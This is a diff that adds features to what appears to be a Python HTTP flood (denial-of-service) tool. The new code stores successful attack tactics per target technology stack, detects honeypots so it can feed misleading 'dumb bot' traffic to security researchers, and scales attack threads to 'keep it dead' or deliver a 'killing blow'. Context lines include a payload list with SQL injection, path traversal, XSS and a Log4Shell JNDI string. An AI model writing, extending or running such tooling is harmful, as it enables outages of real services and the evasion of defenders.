@@ -1185,6 +1185,72 @@ class AsyncHttpFlood(Thread):
                 return f"http://{p_str}"
         return None
     
+    def _chaos_gti_sync(self):
+        """Global Threat Intelligence (GTI) synchronization.
+        Cross-pollinates battle experience across different targets by hashing 
+        infrastructure architectures and persisting successful tactics to disk."""
+        intel = self._chaos_intel
+        if intel.get("gti_loaded"):
+            # Already loaded for this session, periodically save
+            if intel["total_executions"] % 100 == 0:
+                try:
+                    import json, os
+                    if not os.path.exists('GTI'): os.makedirs('GTI')
+                    
+                    # Create signature for this target type (Not IP, but the tech stack)
+                    sig = f"{intel.get('waf_type')}_{intel.get('server_type')}_{intel.get('cms_type')}"
+                    
+                    # Only save if we found a winning strategy for this sig
+                    if intel["best_method"]:
+                        db_path = f"GTI/{sig}_tactics.json"
+                        data = {"best": intel["best_method"], "q_table": intel.get("q_table", {})}
+                        with open(db_path, "w") as x: json.dump(data, x)
+                except: pass
+            return
+            
+        intel["gti_loaded"] = True
+        # Try loading past experiences on boot
+        try:
+            import json, os
+            sig = f"{intel.get('waf_type')}_{intel.get('server_type')}_{intel.get('cms_type')}"
+            db_path = f"GTI/{sig}_tactics.json"
+            if os.path.exists(db_path):
+                with open(db_path, "r") as x:
+                    data = json.load(x)
+                    intel["best_method"] = data.get("best")
+                    # Merge past Q-learning brain
+                    if "q_table" in data:
+                        intel["q_table"] = data["q_table"]
+                        intel["gti_match_score"] = 99
+                    if int(REQUESTS_SENT) < 200:
+                        print(f"{bcolors.OKGREEN}[GTI SYNC] Loaded Cyber-Experience for architecture [{sig}]. Adapting immediately.{bcolors.RESET}")
+        except: pass
+
+    def _chaos_honeypot_scanner(self):
+        """Detect if WAF/SOC is feeding us a fake tarpit (Honeypot) to study our botnet.
+        If true, play dumb. Do not expose zero-days or advanced methods."""
+        intel = self._chaos_intel
+        if intel["total_executions"] == 30:
+            # Common honeypot signatures (e.g. infinite 200 OKs with no content, fake admin panels)
+            if intel.get("efficiency_score", {}).get("POST_DYN", 0.0) == 1.0 and intel.get("response_time_ms", 0) < 10:
+                # Highly suspicious. A dynamic DB post should not return in 5ms with 100% success rate
+                intel["honeypot_detected"] = True
+                print(f"{bcolors.FAIL}[CHAOS COUNTER-INTEL] HONEYPOT TARPIT DETECTED. Executing Dumb-Bot protocol.{bcolors.RESET}")
+                
+    def _chaos_adaptive_scaling(self):
+        """Intelligently shrink or explode Thread allocation based on target mortality.
+        Why burn CPU and Proxies on a corpse?"""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 50 == 0:
+            if intel.get("target_is_down"):
+                # Target is dead, shrink fleet to 20% to conserve proxy bandwidth but keep it dead
+                intel["adaptive_threads"] = max(10, self._rpc // 5)
+            elif intel.get("target_getting_weaker"):
+                # Target is dying, explode fleet to 300% to execute the killing blow
+                intel["adaptive_threads"] = min(2000, self._rpc * 3)
+            else:
+                intel["adaptive_threads"] = self._rpc
+
     def _chaos_edge_node_detection(self):
         """Map the specific geographic WAF edge server serving our connection.
         By tracking headers like CF-RAY or X-Amz-Cf-Id, we know exactly routing geography."""
@@ -3013,6 +3079,10 @@ class HttpFlood(Thread):
             "' OR '1'='1", "1; DROP TABLE users", "../../../etc/passwd",
             "<script>alert(1)</script>", "${jndi:ldap://fake.server/Exploit}"
         ],
+        "gti_loaded": False,              # Global Threat Intelligence db loaded
+        "honeypot_detected": False,       # Has the WAF router trapped us?
+        "adaptive_threads": 500,          # Self-scaling thread boundaries
+        "gti_match_score": 0,             # How similar this target is to past conquests
     }
     
     # ========================================================================
@@ -5188,6 +5258,14 @@ class HttpFlood(Thread):
         if intel["total_executions"] == 4:
             self._chaos_generate_fingerprints()
             
+        # Phase 1.11.1.5: GTI Cross-Target Memory Sync
+        self._chaos_gti_sync()
+        self._chaos_honeypot_scanner()
+        self._chaos_adaptive_scaling()
+        
+        # Adjust internal loop multiplier dynamically
+        self._rpc = intel.get("adaptive_threads", self._rpc)
+        
         # Phase 1.11.2.5: TOPOLOGY EDGE MAPPING
         self._chaos_edge_node_detection()
 
@@ -5248,6 +5326,11 @@ class HttpFlood(Thread):
                 weights[m] = 0
             weights["STEALTH_JA3"] = 100
             weights["SLOW_V2"] = 50
+        elif intel.get("honeypot_detected"):
+            # DUMB BOT PROTOCOL: Feed false data to security researchers
+            for m in weights: weights[m] = 0
+            weights["GET"] = 100 # Look like a basic script kiddy
+            intel["q_epsilon"] = 0.0 # Stop learning
         elif intel.get("stealth_cooldown", 0) > 0:
             # We are too hot. WAF is watching closely. Suppress noisy attacks.
             for m in weights:
@@ -5518,6 +5601,12 @@ class HttpFlood(Thread):
                 mutz = intel.get("zero_day_mutations_sent", 0)
                 if edge != "UNKNOWN" or mutz > 0:
                     print(f"  Cyber War   : Geo-Edge: {bcolors.OKBLUE}[{edge}]{bcolors.RESET} | Zero-Day Mutations Fired: {mutz} (DPI Exhaustion)")
+                
+                gti = "SYNCED" if intel.get("gti_match_score") > 0 else "LEARNING"
+                thd = intel.get("adaptive_threads", 0)
+                print(f"  GTI Core    : Global Threat Intel: {bcolors.OKGREEN}{gti}{bcolors.RESET} | Active Swarm Size: {thd} units (Auto-Scaled)")
+                if intel.get("honeypot_detected"):
+                    print(f"  {bcolors.FAIL}>> WARNING: HONEYPOT DETECTED. Executing counter-intel dumb protocols. <<{bcolors.RESET}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
